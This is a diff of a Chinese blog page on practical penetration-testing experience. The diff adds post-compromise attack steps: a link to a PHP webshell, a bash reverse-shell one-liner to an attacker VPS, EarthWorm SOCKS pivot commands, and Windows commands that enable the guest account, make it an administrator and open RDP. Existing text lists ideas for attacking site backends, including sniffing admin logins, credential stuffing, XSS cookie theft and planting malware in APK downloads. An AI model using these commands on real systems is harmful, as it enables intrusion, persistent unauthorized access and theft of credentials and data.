@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="渗透测试之实战经验一些思路目前可进入目标网站后台和后续的渗透思路有以下一些：1、修改后台登录入口嗅探登录的用户和密码；2、通过加密算法生成密文字典进行撞库攻击；3、通过加密算法生成密文后进入数据库修改；4、XSS打Cookie或Flash水坑钓鱼等攻击方式；5、APK中注入恶意程序，替换APK的下载地址；   数据库的一些操作1、查询管理员用户：   1SELECT * FROM &#96;cmf_use">
+<meta name="description" content="渗透测试之实战经验加解密base64解码文件1base64 -d 1.txt &gt;www.zip ##base64解码  php大马https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Kevil-hui&#x2F;BestShell&#x2F;master&#x2F;best_php_shell.php 控制之后反弹Linux反弹shell 1&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透测试之实战经验">
-<meta property="og:url" content="https://shentoux.github.io/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/index.html">
+<meta property="og:url" content="https://shentoux.github.io/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/index.html">
 <meta property="og:site_name" content="渗透测试经验及技巧">
-<meta property="og:description" content="渗透测试之实战经验一些思路目前可进入目标网站后台和后续的渗透思路有以下一些：1、修改后台登录入口嗅探登录的用户和密码；2、通过加密算法生成密文字典进行撞库攻击；3、通过加密算法生成密文后进入数据库修改；4、XSS打Cookie或Flash水坑钓鱼等攻击方式；5、APK中注入恶意程序，替换APK的下载地址；   数据库的一些操作1、查询管理员用户：   1SELECT * FROM &#96;cmf_use">
+<meta property="og:description" content="渗透测试之实战经验加解密base64解码文件1base64 -d 1.txt &gt;www.zip ##base64解码  php大马https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Kevil-hui&#x2F;BestShell&#x2F;master&#x2F;best_php_shell.php 控制之后反弹Linux反弹shell 1&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-13T06:05:02.963Z">
-<meta property="article:modified_time" content="2022-11-13T06:05:02.963Z">
+<meta property="article:published_time" content="2022-11-14T01:46:52.595Z">
+<meta property="article:modified_time" content="2022-11-14T01:46:52.595Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 
@@ -119,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="https://shentoux.github.io/2022/11/13/渗透测试之实战经验/"/>
+  <link rel="canonical" href="https://shentoux.github.io/2022/11/14/渗透测试之实战经验/"/>
 
 
 
@@ -232,7 +232,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -261,8 +261,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-13T14:05:02+08:00">
-                2022-11-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-11-14T09:46:52+08:00">
+                2022-11-14
               </time>
             
 
@@ -299,7 +299,26 @@
       
 
       
-        <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
+        <h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h5 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h5><h6 id="base64解码文件"><a href="#base64解码文件" class="headerlink" title="base64解码文件"></a>base64解码文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d 1.txt &gt;www.zip <span class="comment">##base64解码</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="php大马"><a href="#php大马" class="headerlink" title="php大马"></a>php大马</h5><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php">https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php</a></p>
+<h5 id="控制之后"><a href="#控制之后" class="headerlink" title="控制之后"></a>控制之后</h5><h6 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h6><p>Linux反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/vps的ip/4444 0&gt;&amp;1 <span class="comment">##反弹shell</span></span><br></pre></td></tr></table></figure>
+
+<p>代理做跳板：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew <span class="literal">-s</span> rssocks <span class="literal">-d</span> vps的ip <span class="literal">-e</span> <span class="number">8888</span> <span class="comment">##被控制的主机</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew: ./ew -s rcsocks -l 1080 -e 8888 <span class="comment">##公网vps/控制机</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h6 id="guest开启3389"><a href="#guest开启3389" class="headerlink" title="guest开启3389"></a>guest开启3389</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user  guest  /active:yes                      <span class="comment">#激活guest用户</span></span><br><span class="line">net localgroup  administrators  guest  /add       <span class="comment">#将guest用户添加到administrators</span></span><br><span class="line">net user guest    密码                            <span class="comment">#更改guest用户密码</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f   <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
 <h5 id="数据库的一些操作"><a href="#数据库的一些操作" class="headerlink" title="数据库的一些操作"></a>数据库的一些操作</h5><p>1、查询管理员用户：  </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE `user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>;</span><br></pre></td></tr></table></figure>
 <p>2、查询多少用户在用这个密码：</p>
@@ -352,8 +371,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/11/13/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%20Github%20%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%EF%BC%9F/" rel="next" title="如何利用 Github 搭建自己的免费图床">
-                <i class="fa fa-chevron-left"></i> 如何利用 Github 搭建自己的免费图床
+              <a href="/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
               </a>
             
           </div>
@@ -437,7 +456,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -474,7 +493,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C"><span class="nav-number">1.</span> <span class="nav-text">渗透测试之实战经验</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">一些思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">数据库的一些操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xss%E8%84%9A%E6%9C%AC"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">xss脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84%E7%BB%88%E7%AB%AF"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">渗透后得到交互式的终端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E6%89%93%E5%8C%85%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">渗透后打包网站源码导出数据库操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%97%A0%E4%BA%A4%E4%BA%92%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%9B%B2%E8%BE%93%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">mysql无交互的情况下盲输语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#APP%E7%9B%B8%E5%85%B3%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">APP相关思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#app%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.1.</span> <span class="nav-text">app敏感数据提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC%E7%B3%BB%E5%88%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">渗透后网页挂马系列</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#cs%E7%9B%B8%E5%85%B3"><span class="nav-number">1.1.1.1.1.</span> <span class="nav-text">cs相关</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cecho%E5%86%99%E7%A0%81"><span class="nav-number">1.1.1.1.2.</span> <span class="nav-text">命令执行echo写码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#csv%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">csv文件合并</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C"><span class="nav-number">1.</span> <span class="nav-text">渗透测试之实战经验</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">加解密</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#base64%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6"><span class="nav-number">1.0.0.1.1.</span> <span class="nav-text">base64解码文件</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E5%A4%A7%E9%A9%AC"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">php大马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E4%B9%8B%E5%90%8E"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">控制之后</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9"><span class="nav-number">1.0.0.3.1.</span> <span class="nav-text">反弹</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#guest%E5%BC%80%E5%90%AF3389"><span class="nav-number">1.0.0.3.2.</span> <span class="nav-text">guest开启3389</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">一些思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">数据库的一些操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xss%E8%84%9A%E6%9C%AC"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">xss脚本</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84%E7%BB%88%E7%AB%AF"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">渗透后得到交互式的终端</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E6%89%93%E5%8C%85%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.0.0.8.</span> <span class="nav-text">渗透后打包网站源码导出数据库操作</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%97%A0%E4%BA%A4%E4%BA%92%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E7%9B%B2%E8%BE%93%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.0.0.9.</span> <span class="nav-text">mysql无交互的情况下盲输语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#APP%E7%9B%B8%E5%85%B3%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">APP相关思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#app%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="nav-number">1.1.1.</span> <span class="nav-text">app敏感数据提取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E5%90%8E%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC%E7%B3%BB%E5%88%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">渗透后网页挂马系列</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#cs%E7%9B%B8%E5%85%B3"><span class="nav-number">1.1.1.1.1.</span> <span class="nav-text">cs相关</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cecho%E5%86%99%E7%A0%81"><span class="nav-number">1.1.1.1.2.</span> <span class="nav-text">命令执行echo写码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#csv%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">csv文件合并</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
